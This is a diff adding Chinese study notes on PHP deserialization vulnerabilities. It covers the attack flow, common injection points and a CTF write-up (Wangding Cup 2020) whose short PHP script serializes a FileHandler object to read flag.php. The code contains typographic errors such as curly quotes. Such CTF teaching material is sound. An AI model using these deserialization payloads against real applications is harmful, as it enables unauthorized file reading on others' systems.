@@ -1,0 +1,35 @@
+# 二、网安/渗透基础
+
+### 1. 漏洞原理流程
+- **正常流程**：程序内部数据 → 序列化 → 加密/签名 → 网络传输
+- **攻击流程**：攻击者构造恶意序列化数据 → 传入接口/Cookie → 后端直接反序列化 → 自动触发危险方法执行
+
+### 2. 常见出现位置
+- Cookie 字段
+- POST 请求参数
+- 隐藏表单
+- HTTP 请求头
+
+### 3. 真实案例认知
+- 网鼎杯2020青龙大真题-有类魔术方法触发-实例
+_construct()//创建对象时触发
+_destruct()//对象被销毁时触发
+
+首先ctf命名及代码函数unserialize判断反序列化知识点
+第一:获取flag存储flag·php
+第二:两个魔术方法__destruct__construct
+第三:传输str参数数据后触发destruct，存储is_valid过滤
+第四:__destruct中会调用process,其中op=1写入及op=2读取             需要 2 绕过强制替换if($this->op==="2")
+第五:涉及对象FileHandler,变量op及filename,content,进行构造输出
+
+<?php
+class FileHandler{
+    public $op=“2”;//源码告诉我们op为1时候是执行写入为2时执行读
+    public $filename="flag.php”;//文件开头调用的是flag.php
+    public $content="xd";
+}
+$flag = new FileHandler();
+$flag_1 = serialize($flag);
+echo $flag_1;
+?>
+得到序列化验证后得到payload.
